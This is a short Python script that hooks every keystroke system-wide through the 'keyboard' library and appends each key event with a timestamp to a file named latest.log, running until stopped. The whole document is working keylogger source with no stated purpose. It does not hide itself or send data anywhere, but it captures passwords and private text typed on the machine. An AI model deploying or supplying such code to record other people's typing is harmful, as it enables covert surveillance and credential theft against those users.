import keyboard
import logging


def save_key(event):
    logging.info(str(event))


def logger():
    logging.basicConfig(filename='latest.log', filemode='a', format='[%(asctime)s]: %(message)s', level=logging.INFO)
    logging.info('__log start__')
    keyboard.hook(save_key)
    keyboard.wait()


logger()